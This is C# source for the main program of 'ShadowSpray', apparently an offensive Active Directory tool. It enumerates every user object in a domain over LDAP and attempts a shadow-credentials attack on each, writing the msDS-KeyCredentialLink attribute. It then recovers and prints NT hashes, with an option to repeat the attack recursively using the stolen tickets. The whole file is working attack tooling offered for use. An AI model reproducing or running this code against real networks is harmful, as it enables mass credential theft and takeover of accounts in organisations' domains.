using ShadowSpray.Kerb;
using ShellProgressBar;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;

namespace ShadowSpray
{

    public static class Options
    {

        // General Options
        public static string username = null;
        public static string password = null;
        public static string domain = null;
        public static string domainDN = "";
        public static string domainController = null;
        public static bool useSSL = false;
        public static int ldapPort = 389;
        public static bool verbose = false;
        public static bool auto_y = false;

        // SHADOWCRED Method
        public static bool shadowCredRestore = false;
        public static bool shadowCredRecursive = false;
        public static string shadowCredCertificatePassword = null;

        public static void PrintOptions()
        {
            var allPublicFields = typeof(Options).GetFields();
            foreach (var opt in allPublicFields)
            {
                Console.WriteLine($"{opt.Name}:{opt.GetValue(null)}");
            }
        }

        public static void GetHelp()
        {
            Console.WriteLine("");
            Console.WriteLine("Usage: ShadowSpray.exe [-d FQDN] [-dc FQDN] [-u USERNAME] [-p PASSWORD] [-r] [-re] [-cp CERT_PASSWORD] [-ssl]\n");

            Console.WriteLine("    -r   (--RestoreShadowCred)       Restore \"msDS-KeyCredentialLink\" attribute after the attack is done. (Optional)");
            Console.WriteLine("    -re  (--Recursive)               Perform ShadowSpray attack recursivly. (Optional)");
            Console.WriteLine("    -cp  (--CertificatePassword)     Certificate password. (default = random password)");


            Console.WriteLine("\n");
            Console.WriteLine("General Options:");
            Console.WriteLine("    -u  (--Username)                 Username for initial LDAP authentication. (Optional)");
            Console.WriteLine("    -p  (--Password)                 Password for initial LDAP authentication. (Optional)");
            Console.WriteLine("    -d  (--Domain)                   FQDN of domain. (Optional)");
            Console.WriteLine("    -dc (--DomainController)         FQDN of domain controller. (Optional)");
            Console.WriteLine("    -ssl                             Use LDAP over SSL. (Optional)");
            //Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");
            Console.WriteLine("    -y  (--AutoY)                    Don't ask for confirmation to start the ShadowSpray attack. (Optional)");


            Console.WriteLine("");
        }

        public static bool ParseArgs(string[] args)
        {
            int iHelp = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(h|Help)$").Match(s).Success);
            if (args.Length == 0 || (iHelp != -1))
            {
                GetHelp();
                return false;
            }

            int iUsername = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(u|Username)$").Match(s).Success);
            int iPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Password)$").Match(s).Success);
            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
            int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
            int iSSL = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ssl)$").Match(s).Success);
            //int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
            int iauto_y = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(y|AutoY)$").Match(s).Success);
            Options.username = (iUsername != -1) ? args[iUsername + 1] : Options.username;
            Options.password = (iPassword != -1) ? args[iPassword + 1] : Options.password;
            Options.domain = (iDomain != -1) ? args[iDomain + 1] : Options.domain;
            Options.domainController = (iDomainController != -1) ? args[iDomainController + 1] : Options.domainController;
            Options.useSSL = (iSSL != -1) ? true : Options.useSSL;
            if (Options.useSSL)
                Options.ldapPort = 636;
            //Options.verbose = (iVerbose != -1) ? true : Options.verbose;
            Options.auto_y = (iauto_y != -1) ? true : Options.auto_y;

            // SHADOWCRED
            int iShadowCredRestore = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(r|RestoreShadowCred)$").Match(s).Success);
            int iShadowCredCertificatePassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|CertificatePassword)$").Match(s).Success);
            int iShadowCredRecursive = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(re|Recursive)$").Match(s).Success);
            Options.shadowCredRestore = (iShadowCredRestore != -1) ? true : Options.shadowCredRestore;
            Options.shadowCredCertificatePassword = (iShadowCredCertificatePassword != -1) ? args[iShadowCredCertificatePassword + 1] : Options.shadowCredCertificatePassword;
            Options.shadowCredRecursive = (iShadowCredRecursive != -1) ? true : Options.shadowCredRecursive;

            return true;

        }

    }

    public class Program
    {
        static ShadowCred attacker = new ShadowCred();
        public static bool exitToken = false;

        static void PrintBanner()
        {
            Console.WriteLine(@"
 __             __   __        __   __   __           
/__` |__|  /\  |  \ /  \ |  | /__` |__) |__)  /\  \ / 
.__/ |  | /~~\ |__/ \__/ |/\| .__/ |    |  \ /~~\  |  
");
        }

        public static void Main(string[] args)
        {
            PrintBanner();

            if (!Options.ParseArgs(args))
                return;

            // If domain or dc is null try to find the them automatically
            if (String.IsNullOrEmpty(Options.domain) || String.IsNullOrEmpty(Options.domainController))
            {
                if (!Networking.GetDomainInfo())
                    return;
            }

            // Check if domain controller is an IP and if so try to resolve it to the DC FQDN
            if (!String.IsNullOrEmpty(Options.domainController))
            {
                Options.domainController = Networking.GetDCNameFromIP(Options.domainController);
                if (String.IsNullOrEmpty(Options.domainController))
                {
                    Console.WriteLine("[-] Could not find Domain Controller FQDN From IP. Try specifying the FQDN with --DomainController flag.");
                    return;
                }
            }
            Options.domainDN = Networking.GetDomainDN(Options.domain);
            
            
            if (!attacker.ConnectToLDAP(username: Options.username, password: Options.password))
                return;

            if (!IsDomainFunctionalLevel2016())
                return;

            Dictionary<string, string> allDomainObjects = GetAllDomainObjects(); 
            Console.WriteLine($"[+] Found {allDomainObjects.Count} objects");
            
            if (!Options.auto_y)
            {
                Console.WriteLine("[?] Continue with attack?[Y/n]");
                if (new string[] { "n", "N" }.Contains(Console.ReadLine()))
                {
                    Console.WriteLine("[+] Attack aborted. Exiting...");
                    return;
                }
            }
            else
                Console.WriteLine();

            attacker.Prepare();

            Console.CancelKeyPress += (object sender, ConsoleCancelEventArgs eventArgs) =>
            {
                eventArgs.Cancel = true;
                exitToken = true;
            };

            int totalTicks = allDomainObjects.Count;
            var options = new ProgressBarOptions
            {
                //ProgressCharacter = '#',
                ProgressBarOnBottom = false,
                ForegroundColor = ConsoleColor.White,
                ForegroundColorDone = ConsoleColor.Gray,
                BackgroundColor = ConsoleColor.DarkGray,
                BackgroundCharacter = '\u2593'
            };
            var pbar = new ProgressBar(totalTicks, "Initial message", options);

            int counter = 0;
            string msg = "";

            foreach (KeyValuePair<string,string> de in allDomainObjects)
            {
                if (exitToken)
                {
                    Thread.Sleep(1000);
                    Console.WriteLine("\n\n\n[!] CTRL+C detected - Getting ready to exit");
                    
                    if (attacker.shadowCredObjects.Count > 0)
                        DisplayHashes();

                    Console.WriteLine("\n[!] Exiting...");
                    return;
                }
                try
                {
                    msg = attacker.attack(de.Key, de.Value);
                }
                catch (Exception e) 
                {
                    // print error message if not "LDAP_INSUFFICIENT_ACCESS"
                    if (e.HResult != (-2146233088))
                        msg = e.Message;
                }
                counter++;
                pbar.Tick($"({counter}/{totalTicks}) | {attacker.shadowCredObjects.Count} NTHashes Recovered | {msg}");
            }
            pbar.Tick($"({counter}/{totalTicks}) | {attacker.shadowCredObjects.Count} NTHashes Recovered | [+] Done");
            pbar.Dispose();

            if (Options.shadowCredRecursive)
            {
                Console.WriteLine("\n[+] Performing recursive ShadowSpray attack. This might take a while...");
                for (int i = 0; i < attacker.shadowCredObjects.Count; i++)
                {

                    for (int j = 0; j < attacker.shadowCredObjects.Count; j++)
                    {
                        allDomainObjects.Remove(attacker.shadowCredObjects[j].samAccountName);
                    }

                    if (allDomainObjects.Count == 0)
                        continue;

                    ShadowCredObject shadowCredObject = attacker.shadowCredObjects[i];

                    if (!attacker.ConnectToLDAP(TGT: shadowCredObject.TGT, username:shadowCredObject.samAccountName))
                        continue;

                    msg = "";
                    counter = 0;
                    totalTicks = allDomainObjects.Count;
                    pbar = new ProgressBar(totalTicks, "Initial message", options);

                    foreach (KeyValuePair<string, string> de in allDomainObjects)
                    {
                        if (exitToken)
                        {
                            Thread.Sleep(1000);
                            Console.WriteLine("\n\n\n[!] CTRL+C detected - Getting ready to exit");
                            
                            if (attacker.shadowCredObjects.Count > 0)
                                DisplayHashes();

                            Console.WriteLine("\n[!] Exiting...");
                            return;
                        }
                        try
                        {
                            msg = attacker.attack(de.Key, de.Value);
                        }
                        catch (Exception e)
                        {
                            // print error message if not "LDAP_INSUFFICIENT_ACCESS"
                            if (e.HResult != (-2146233088))
                                msg = e.Message;
                        }
                        counter++;
                        pbar.Tick($"({counter}/{totalTicks}) | {attacker.shadowCredObjects.Count} NTHashes Recovered | {msg}");
                    }
                    pbar.Tick($"({counter}/{totalTicks}) | {attacker.shadowCredObjects.Count} NTHashes Recovered | [+] Done");
                    pbar.Dispose();
                }
            }

            DisplayHashes();

            Console.WriteLine();

        }

        static void DisplayHashes()
        {
            Console.WriteLine($"\n[+] ShadowSpray recovered {attacker.shadowCredObjects.Count} NTHashes:");
            foreach (ShadowCredObject shadowCredObject in attacker.shadowCredObjects)
            {
                Console.WriteLine($"    {shadowCredObject.samAccountName}: {shadowCredObject.NTHash}");
            }
        }

        static bool IsDomainFunctionalLevel2016()
        {
            Console.WriteLine("[+] Checking for domain functional level");
            string endpoint = (!string.IsNullOrEmpty(Options.domainController)) ? Options.domainController : Options.domain;
            DirectoryEntry domain = new DirectoryEntry($"LDAP://{endpoint}/{Options.domainDN}");

            if ((int)domain.Properties["msDS-Behavior-Version"][0] == 7)
            {
                Console.WriteLine("[+] Domain functional level is 2016. Continuing...\n");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Domain functional level is not 2016 - ShadowSpray won't work. Exiting...\n");
                return false;
            }
        }

        static Dictionary<string, string> GetAllDomainObjects()
        {
            Console.WriteLine("[+] Searching for all domain objects");
            Dictionary<string, string> allDomainObjects = new Dictionary<string, string>();

            string endpoint = (!string.IsNullOrEmpty(Options.domainController)) ? Options.domainController : Options.domain;
            DirectoryEntry domain = new DirectoryEntry($"LDAP://{endpoint}/{Options.domainDN}");
            var searcher2 = new DirectorySearcher(domain)
            {
                PropertiesToLoad = {"SamAccountName", "DistinguishedName"},
                SearchScope = SearchScope.Subtree,
                Filter = "(&(objectClass=user))",
                PageSize = 1000
            };
            foreach (SearchResult result in searcher2.FindAll())
                allDomainObjects.Add((string)result.Properties["SamAccountName"][0], (string)result.Properties["DistinguishedName"][0]);
            return allDomainObjects;
            using (var context = new PrincipalContext(ContextType.Domain))
            {
                using (var searcher = new PrincipalSearcher(new UserPrincipal(context)))
                {
                    foreach (var result in searcher.FindAll())
                    {
                        allDomainObjects.Add(result.SamAccountName, result.DistinguishedName);

                    }
                    searcher.Dispose();
                }
                using (var searcher = new PrincipalSearcher(new ComputerPrincipal(context)))
                {
                    foreach (var result in searcher.FindAll())
                    {
                        allDomainObjects.Add(result.SamAccountName, result.DistinguishedName);

                    }
                    searcher.Dispose();
                }
                context.Dispose();
            }
            allDomainObjects.Remove("krbtgt");
            allDomainObjects.Remove("Guest");
            return allDomainObjects;
        }

    }
}
